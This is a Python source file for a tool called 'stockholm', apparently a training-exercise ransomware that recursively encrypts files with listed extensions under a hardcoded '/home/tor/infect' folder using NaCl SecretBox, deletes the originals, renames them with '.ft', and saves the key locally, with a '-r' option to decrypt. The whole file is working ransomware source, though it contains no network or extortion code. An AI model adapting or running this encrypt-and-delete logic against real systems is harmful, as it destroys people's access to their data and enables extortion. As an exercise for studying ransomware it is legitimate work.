import nacl.secret as secret
import nacl.utils
import os
import sys
import extensions

USAGE = '''
    stockholm [-h -v -s] [-r <keyfile>]
    -h displays this help
    -v shows current vresion
    -s avoids printing the files being encripted or decripted
    -r reverse indicates that it should decrypt the files with the key saved in keyfile file
'''
VERSION = 1.0
EXTENSION = ".ft"
KEY_FILE = "key.key"
class twk_encrypter():
    def __init__(self, flags, key = None):
        self.flags = flags
        self.home  = os.environ.get("HOME")
        if (not self.home):
            print("Could not get HOME global variable")
            return
        if (not key):
            print("generating new key")
            self.key = nacl.utils.random(nacl.secret.SecretBox.KEY_SIZE)
        else: 
            self.key = key
        self.box = secret.SecretBox(self.key)
        self.extensions = [e[1:] for e in extensions.extensions]
        self.nonce = (1).to_bytes(24, 'big');
        if (not self.flags.get('r')):
            with open(KEY_FILE, 'wb') as kf:
                kf.write(self.key)

    def encrypt(self, path = None):
        if (not path):
            path = self.home
        directories = []
        files = []
        for f in os.listdir(path):
            file_route = path + '/' + f
            if not os.access(file_route, os.W_OK | os.R_OK, follow_symlinks = False): # TODO by defautl it is using the real UIDD instead of the effective UIDD. This should be cchecked, I want to knwo wheter i have acces or not. I dont want to know if I should have access.
                continue
            if os.path.isdir(file_route):
                directories.append(file_route)
            elif f.split(".")[-1] in self.extensions:
                files.append(file_route)
        for f in files:
            self.encrypt_file(f)
        for d in directories:
            self.encrypt(path = d)

    def decrypt(self, path = None):
        if (not path):
            path = self.home
        directories = []
        files = []
        for f in os.listdir(path):
            file_route = path + '/' + f
            if not os.access(file_route, os.W_OK | os.R_OK, follow_symlinks = False): # TODO by defautl it is using the real UIDD instead of the effective UIDD. This should be cchecked, I want to knwo wheter i have acces or not. I dont want to know if I should have access.
                continue
            if os.path.isdir(file_route):
                directories.append(file_route)
            elif f.split(".")[-1] == EXTENSION[1:]:
                files.append(file_route)
        
        for f in files:
            self.decrypt_file(f)

        for d in directories:
            self.decrypt(d)

    def encrypt_file(self, f):
        '''
            Must recive the absolute path of the file
        '''
        if (not self.flags.get('s')):
            print(f"Encrypting:  {f}")
        # TODO Is thsi protectin oK? or its too much c way
        fpi = open(f, 'rb')
        if (not fpi):
            return
        fo = f + EXTENSION if f[-3:] != EXTENSION else f
        fpo = open(fo, 'wb')
        if (not fpo):
            fpi.close()
            return 
        
        #TODO its reading the hole file in once. Doesnt loook like a good idea
        text = fpi.read()
        encrypted_text = self.box.encrypt(text, nonce=(self.nonce))
        nonce = int.from_bytes(self.nonce, 'big') + 1
        self.nonce = nonce.to_bytes(24, 'big')
        fpo.write(encrypted_text)

        fpi.close()
        fpo.close()
        os.remove(f)

    def decrypt_file(self, f):
        '''
            Must recive the absolute path of the file
        '''
        if (not self.flags.get('s')):
            print(f"Decripting:  {f}")
        # TODO Is thsi protectin oK? or its too much c way
        fpi = open(f, 'rb')
        if (not fpi):
            return
        fo = f[:-3] 
        fpo = open(fo, 'wb')
        if (not fpo):
            print(f"unable to open {fo}")
            fpi.close()
            return 
            
        text = fpi.read()
        try:
            decrypted_text = self.box.decrypt(text)
            fpo.write(decrypted_text)
        except nacl.exceptions.CryptoError  as e:
            print(f"Unable to recover {f}")
            fpi.close()
            fpo.close()
            os.remove(fo)
            return 

        fpi.close()
        fpo.close()
        os.remove(f)
        # TODO handle bad key error

#-h -v -s -r
def args_parser(argv):
    flags = {}
    flags_str = "hvsr"
    for i, f in enumerate(argv):
        if len(f) < 2 or f[0] != '-':
            continue
        f = f[1:]
        if f  in flags_str:
            flags[f] = True
        if (f[0] == 'r' and len(argv) > (i + 1) and argv[i+1][0] != '-'):
            flags[f] = argv[i+1]
        elif (f[0] == 'r' and len(f) > 1):
            flags[f[0]] = f[1:] 

    #TODO -r must recive the key should get shure its valid
    return flags

if __name__ == "__main__":

    flags = args_parser(sys.argv)
    if (flags.get('v')):
        print("Current version: ", VERSION)
    if (flags.get('h')):
        print(USAGE)
        exit()
    key = None
    if (flags.get('r')):
        if (not isinstance(flags['r'], str)):
            print("No key file specified")
            exit()
        with open(flags['r'], 'rb') as f:
            key = f.read()
        if (not key):
            print("Unable to load key")
            exit()

    encrypter = twk_encrypter(flags, key = key)
    if (flags.get('r')):
        encrypter.decrypt("/home/tor/infect")
        f.close()
    else:
        encrypter.encrypt("/home/tor/infect")
